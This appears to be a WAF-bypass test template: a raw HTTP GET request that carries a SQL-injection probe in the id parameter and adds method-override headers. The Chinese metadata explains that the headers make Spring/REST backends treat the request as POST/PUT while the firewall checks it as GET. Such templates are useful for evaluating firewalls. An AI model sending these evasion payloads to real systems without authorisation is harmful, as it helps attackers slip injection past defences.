# @name: HTTP 方法覆盖绕过
# @tags: get,sqli,header,method-override,spring,id,bypass
# @color: green
# @validate: baseline_similarity
# @threshold: 0.90
# @intent: method_override_header
# @intent.param: id
# @intent.payload: id=1' and 'a'='a
# @note: 通过 X-HTTP-Method-Override/X-Method-Override 让后端按 POST/PUT 处理，而 WAF 按请求行 GET 规则检测，规则差异形成绕过（Spring/REST 框架）。
GET /?id=1'+and+'a'='a HTTP/1.1
Host: {{TARGET_HOST_HEADER}}
User-Agent: {{USER_AGENT}}
X-HTTP-Method-Override: POST
X-Method-Override: PUT

